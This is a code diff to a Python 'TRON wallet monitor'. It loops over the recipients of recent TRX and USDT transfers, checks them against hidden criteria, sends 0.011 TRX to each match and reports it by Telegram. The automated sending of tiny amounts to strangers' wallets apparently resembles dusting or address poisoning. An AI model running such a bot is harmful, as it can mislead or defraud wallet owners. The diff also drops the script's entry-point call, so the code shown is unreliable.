@@ -275,15 +275,46 @@ def send_telegram_alert(message):
 def main():
     print("TRON WALLET MONITOR IS RUNNING")
     
-    # Send startup notification
-    try:
-        send_telegram_alert("✅ System Check: TRON Wallet Monitor is ONLINE!")
-        print("✅ Telegram notification sent successfully!")
-    except Exception as e:
-        print(f"❌ Telegram error: {e}")
-        exit(1)
-    
-    print("✅ Test completed successfully!")
+    start_date = datetime.now(timezone.utc) - timedelta(days=WINDOW_DAYS)
+    start_ms = int(start_date.timestamp() * 1000)
 
-if __name__ == "__main__":
-    main()
+    while True:
+        try:
+            # Discover wallets and check conditions
+            print("Discovering recent TRX transfers...")
+            trx_transfers = discover_recent_trx_transfers(start_ms, int(datetime.now(timezone.utc).timestamp() * 1000))
+            print(f"TRX transfers discovered: {len(trx_transfers)}")
+
+            print("Discovering recent USDT transfers...")
+            usdt_transfers = discover_recent_usdt_transfers(start_ms, int(datetime.now(timezone.utc).timestamp() * 1000))
+            print(f"USDT transfers discovered: {len(usdt_transfers)}")
+
+            candidates = set()
+            for tx in trx_transfers:
+                to_address = tx.get("to")
+                if to_address:
+                    candidates.add(to_address)
+
+            for tx in usdt_transfers:
+                to_address = tx.get("to") or tx.get("toAddress") or tx.get("to_address")
+                if to_address:
+                    candidates.add(to_address)
+
+            print(f"Candidate wallets discovered: {len(candidates)}")
+
+            for address in candidates:
+                try:
+                    if check_wallet(address):
+                        # Send a transaction of 0.011 TRX to the matching address
+                        transaction_result = send_transaction(address, 0.011, token='TRX')
+                        txid = transaction_result.txid if transaction_result else "Failed"
+                        send_telegram_alert(f"✅ QUALIFIED WALLET\nWallet: {address}\nTransaction TXID: {txid}")
+                except Exception as e:
+                    print(f"Error checking {address}: {e}")
+
+            print("Waiting 5 minutes before next check...\n")
+            time.sleep(300)
+
+        except Exception as e:
+            print(f"An error occurred in the main loop: {e}")
+            time.sleep(60)
